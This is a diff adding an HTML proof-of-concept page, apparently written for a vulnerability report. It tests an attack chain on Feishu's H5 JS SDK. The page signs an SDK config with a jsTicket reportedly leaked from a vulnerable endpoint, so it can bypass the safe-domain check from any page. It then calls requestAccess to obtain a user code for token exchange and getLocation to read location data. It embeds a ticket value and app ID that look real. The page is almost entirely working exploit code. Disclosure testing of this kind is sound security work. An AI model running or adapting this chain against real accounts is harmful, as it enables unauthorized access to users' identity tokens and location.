@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>Feishu H5 Chain Verify</title>
+<!-- 飞书官方 h5sdk CDN，若加载失败请对照飞书开放平台文档最新地址 -->
+<script src="https://lf1-cdn-tos.bytegoofy.com/goofy/lark/op/h5-js-sdk-1.5.30.js"></script>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:16px;max-width:900px;margin:0 auto}
+  h3{color:#fff;margin:14px 0 6px}
+  pre{background:#000;padding:10px;border:1px solid #333;white-space:pre-wrap;word-break:break-all;min-height:20px}
+  .ok{color:#0f0}.warn{color:#fa0}.err{color:#f44}.dim{color:#888}
+  button{margin:6px 4px;padding:10px 16px;font-size:14px;background:#234;color:#fff;border:1px solid #456;cursor:pointer}
+</style>
+</head>
+<body>
+<h2>飞书 H5 高危链路验证（仅用自有测试账号）</h2>
+<div id="cfginfo" class="dim"></div>
+
+<h3>1. h5sdk.config 结果（判定安全域名校验是否存在）</h3>
+<pre id="r1" class="dim">等待…</pre>
+
+<h3>2. requestAccess 结果（判定应用可用范围 + 拿 userCode）</h3>
+<button onclick="doReq()">点击发起 requestAccess</button>
+<pre id="r2" class="dim">等待…</pre>
+
+<h3>3. getLocation（补充：敏感 JSAPI 可用性）</h3>
+<button onclick="doLoc()">获取位置</button>
+<pre id="r3" class="dim">未调用</pre>
+
+<script>
+// ===== 填空区：用 curl 从漏洞接口拿到的值原样填入，三个值必须来自同一次响应 =====
+const TICKET   = "g104bgbIPFUPTBFLZ2TKKIKLA53V3DTNJVJSEC4X"; // jsTicket
+const NONCESTR = "FILL_ME";                                   // nonceStr
+const TS       = "0";                                         // timestamp（十进制毫秒字符串）
+const APPID    = "cli_a9bcf22cd2f9dcbb";
+// 页面部署后的最终 URL（不带 # 及其后内容），必须与参与签名的 url 完全一致
+const PAGE_URL = location.href.split("#")[0];
+
+const log = (id, cls, txt) => { const e=document.getElementById(id); e.className=cls; e.textContent = typeof txt==="string"?txt:JSON.stringify(txt,null,2); };
+
+async function sha1hex(s){
+  const b = await crypto.subtle.digest("SHA-1", new TextEncoder().encode(s));
+  return [...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,"0")).join("");
+}
+
+(async () => {
+  if (NONCESTR === "FILL_ME") {
+    log("r1","err","先填 TICKET/NONCESTR/TS！curl 命令见复现文档步骤 1");
+    return;
+  }
+  const sig = await sha1hex(`jsapi_ticket=${TICKET}&noncestr=${NONCESTR}&timestamp=${TS}&url=${PAGE_URL}`);
+  log("cfginfo","dim",`page_url = ${PAGE_URL}\nsignature = ${sig}`);
+
+  window.h5sdk.config({
+    appId: APPID,
+    timestamp: Number(TS),
+    nonceStr: NONCESTR,
+    signature: sig,
+    jsApiList: ["requestAccess","getLocation","setNavigationBar","previewImage"],
+    onSuccess: r => log("r1","ok","config 成功 → 飞书客户端未做安全域名校验，链路第一关通过\n"+JSON.stringify(r)),
+    onError: e => log("r1","err","config 失败 → 可能是安全域名校验或签名错误\n"+JSON.stringify(e))
+  });
+  window.h5sdk.error(e => log("r1","err","h5sdk.error: "+JSON.stringify(e)));
+})();
+
+function doReq(){
+  window.h5sdk.ready(() => {
+    tt.requestAccess({
+      scopeList: ["contact.user.base:readonly"],
+      success: res => log("r2","ok","requestAccess 成功！userCode 如下（下一步换 token）\n"+JSON.stringify(res)),
+      fail: err => log("r2","err","requestAccess 失败\n"+JSON.stringify(err))
+    });
+  });
+}
+function doLoc(){
+  window.h5sdk.ready(() => {
+    tt.getLocation({
+      success: res => log("r3","warn","拿到位置（无二次确认弹窗则问题更大）\n"+JSON.stringify(res)),
+      fail: err => log("r3","err","getLocation 失败\n"+JSON.stringify(err))
+    });
+  });
+}
+</script>
+</body>
+</html>
